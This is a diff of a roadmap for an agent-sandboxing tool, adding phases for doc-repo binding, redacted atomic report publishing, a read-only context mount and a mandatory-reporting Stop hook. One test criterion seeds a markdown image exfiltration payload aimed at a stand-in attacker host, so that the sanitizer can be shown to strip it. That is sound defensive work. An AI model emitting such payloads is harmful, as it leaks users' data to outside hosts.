@@ -5,6 +5,7 @@
 - v1.0 MVP -- Phases 1-11 (shipped 2026-04-11)
 - v2.0 Headless Agent Mode -- Phases 12-17 (shipped 2026-04-12)
 - v3.0 macOS Support -- Phases 18-22 (in progress)
+- v4.0 Agent Documentation Layer -- Phases 23-26 (planning)
 
 ## Phases
 
@@ -44,6 +45,13 @@
 - [ ] **Phase 20: Network Enforcement on macOS** - Empirical spike resolves iptables-vs-pf, then implements network-level call enforcement
 - [ ] **Phase 21: launchd Service Management** - Webhook listener and reaper run as LaunchDaemons; installer completes end-to-end on macOS
 - [ ] **Phase 22: macOS Integration Tests** - TCP-level block tests and launchd lifecycle tests verify v3.0 against silent-failure modes
+
+### v4.0 Agent Documentation Layer (Planning)
+
+- [ ] **Phase 23: Profile ↔ Doc Repo Binding** - Profile schema holds doc repo coordinates and host-only PAT; `init-docs` bootstraps per-project directory layout
+- [ ] **Phase 24: Multi-File Publish Bundle** - Host-side `publish_docs_bundle` writes standardized reports + INDEX.md as single atomic commit through existing redaction pipeline
+- [ ] **Phase 25: Context Read & Read-Only Bind Mount** - Sparse shallow clone of doc repo bind-mounted read-only at `/agent-docs/` so agents can read project context without push access
+- [ ] **Phase 26: Stop Hook & Mandatory Reporting** - Stop hook verifies local spool (no network); host-side async shipper pushes reports with jittered backoff, never blocking Claude exit
 
 ## Phase Details
 
@@ -108,11 +116,58 @@
   3. The full v3.0 test suite is added to the pre-push hook test selection so any change touching macOS code paths runs the tests automatically
 **Plans**: TBD
 
+### Phase 23: Profile ↔ Doc Repo Binding
+**Goal**: Profiles carry doc-repo coordinates and a host-only write PAT, and users can initialize the per-project doc layout with one command — all with zero breakage for existing Phase 16 profiles
+**Depends on**: Nothing (first v4.0 phase; extends Phase 12 profile schema)
+**Requirements**: BIND-01, BIND-02, BIND-03, DOCS-01
+**Success Criteria** (what must be TRUE):
+  1. A user can set `docs_repo`, `docs_branch`, and `docs_project_dir` in a profile's `profile.json`, place `DOCS_REPO_TOKEN` in the profile `.env`, and `claude-secure` validates all four fields at spawn time, failing closed with an actionable message when any are missing or malformed
+  2. `DOCS_REPO_TOKEN` is present in the host profile `.env` but provably absent from the Claude container environment — a container-side `env` dump contains neither the value nor the variable name
+  3. Profiles that still carry legacy `report_repo` / `REPORT_REPO_TOKEN` from Phase 16 continue to resolve correctly: the new fields act as aliases, the old fields are honored if present, and a one-line deprecation warning is logged on first use
+  4. Running `claude-secure profile init-docs --profile <name>` in an empty doc repo creates `projects/<slug>/` containing `todo.md`, `architecture.md`, `vision.md`, `ideas.md`, `specs/`, and `reports/INDEX.md` as a single atomic commit, and is idempotent when the layout already exists
+**Plans**: TBD
+
+### Phase 24: Multi-File Publish Bundle (Outbound Path)
+**Goal**: A single host-side call can commit a full agent report plus an INDEX.md update to the doc repo atomically, after running every staged file through secret redaction and markdown sanitization
+**Depends on**: Phase 23 (reads profile doc-repo fields)
+**Requirements**: DOCS-02, DOCS-03, RPT-01, RPT-02, RPT-03, RPT-04, RPT-05
+**Success Criteria** (what must be TRUE):
+  1. Calling `publish_docs_bundle` with a rendered report writes it to `projects/<slug>/reports/YYYY/MM/<date>-<session-id>.md` using the mandatory template sections (Goal, Where Worked, What Changed, What Failed, How to Test, Future Findings) and never overwrites an existing file
+  2. The same call appends a one-line timestamped entry to `projects/<slug>/reports/INDEX.md` and commits the report file plus the index update as exactly one git commit — a test that injects a failure mid-bundle leaves the working tree clean with no partial commit
+  3. Every file staged for that commit is passed through the existing Phase 3 secret redaction pipeline before `git add`, and a test seeding a known secret into the report confirms the secret never reaches the remote
+  4. Every staged file is sanitized to strip external image references, raw HTML, and HTML comments before commit, and a test seeding `![](https://attacker.tld/?data=x)` confirms the reference is removed
+  5. Push uses `git push` over HTTPS (never `--force`) with 3-attempt jittered retry on non-fast-forward, and a test that races two concurrent publishes produces two commits on `main` with no lost updates
+**Plans**: TBD
+
+### Phase 25: Context Read & Read-Only Bind Mount
+**Goal**: Agents can read the doc repo's per-project context at spawn time without having any path to push from inside the container
+**Depends on**: Phase 23 (needs `docs_project_dir` to know which subtree to clone)
+**Requirements**: CTX-01, CTX-02, CTX-03, CTX-04
+**Success Criteria** (what must be TRUE):
+  1. On spawn, `bin/claude-secure` performs a sparse shallow clone (`--depth=1 --filter=blob:none --sparse`) of the doc repo's `projects/<slug>/` subtree on the host and bind-mounts it read-only into the container at `/agent-docs/`
+  2. From inside the container, the agent can successfully `cat /agent-docs/projects/<slug>/todo.md`, `architecture.md`, `vision.md`, `ideas.md`, and files under `specs/`, and a write attempt to any path under `/agent-docs/` fails with a read-only filesystem error
+  3. Spawning a profile that has no `docs_repo` configured completes successfully with no clone attempt and no error; logs contain a single info-level line indicating context read was skipped
+  4. `/agent-docs/.git/` does not exist inside the container — verified by a test that lists the mount and asserts absence; the host-side clone either uses sparse-checkout to exclude `.git` or copies the checkout into a `.git`-free directory before bind mount
+**Plans**: TBD
+
+### Phase 26: Stop Hook & Mandatory Reporting
+**Goal**: Every Claude execution guarantees a report reaches the doc repo — enforced by a local-spool Stop hook that cannot be blocked by network failures, with a host-side shipper handling the actual push
+**Depends on**: Phase 24 (publish bundle must exist), Phase 25 (bind mount must exist)
+**Requirements**: SPOOL-01, SPOOL-02, SPOOL-03
+**Success Criteria** (what must be TRUE):
+  1. A Claude session that exits without writing a report spool file triggers the Stop hook to re-prompt Claude exactly once to produce the report; a session that already wrote the spool exits cleanly with zero re-prompts
+  2. The Stop hook makes zero network calls — a test that fails DNS resolution for the doc repo host asserts Claude still exits within 5 seconds of the Stop hook firing, with the spool file written and queued for shipping
+  3. After Claude exits, the host-side async shipper reads the spool, calls `publish_docs_bundle`, and on success deletes the spool; on failure it logs the error with retry counter to the audit JSONL and schedules a jittered retry, and a subsequent failing shipper run never blocks a new `claude-secure spawn`
+  4. The Stop hook's `stop_hook_active` guard prevents recursive re-prompting: a test that seeds a broken report template confirms the hook re-prompts once, then yields without looping, even if the second attempt still fails
+**Plans**: TBD
+**Research flag**: Stop hook API field names (`stop_hook_active`, re-prompt semantics) must be re-verified with Context7 at plan time — API is version-sensitive.
+
 ## Progress
 
 **Execution Order:**
-v3.0 phases execute strictly in numeric order: 18 -> 19 -> 20 -> 21 -> 22
-(Phase 20 is gated on Phase 19's Docker Desktop smoke test; Phase 21 cannot start until Phase 20 commits to an enforcement option.)
+- v3.0 phases execute strictly in numeric order: 18 -> 19 -> 20 -> 21 -> 22
+  (Phase 20 is gated on Phase 19's Docker Desktop smoke test; Phase 21 cannot start until Phase 20 commits to an enforcement option.)
+- v4.0 phases: 23 and 24 may run in parallel (neither depends on the other). 25 depends on 23. 26 depends on 24 and 25. Suggested order: 23 -> 24 -> 25 -> 26, or 23+24 parallel then 25 then 26.
 
 | Phase | Milestone | Plans Complete | Status | Completed |
 |-------|-----------|----------------|--------|-----------|
@@ -138,3 +193,7 @@ v3.0 phases execute strictly in numeric order: 18 -> 19 -> 20 -> 21 -> 22
 | 20. Network Enforcement on macOS | v3.0 | 0/0 | Not started | - |
 | 21. launchd Service Management | v3.0 | 0/0 | Not started | - |
 | 22. macOS Integration Tests | v3.0 | 0/0 | Not started | - |
+| 23. Profile ↔ Doc Repo Binding | v4.0 | 0/0 | Not started | - |
+| 24. Multi-File Publish Bundle | v4.0 | 0/0 | Not started | - |
+| 25. Context Read & Bind Mount | v4.0 | 0/0 | Not started | - |
+| 26. Stop Hook & Mandatory Reporting | v4.0 | 0/0 | Not started | - |
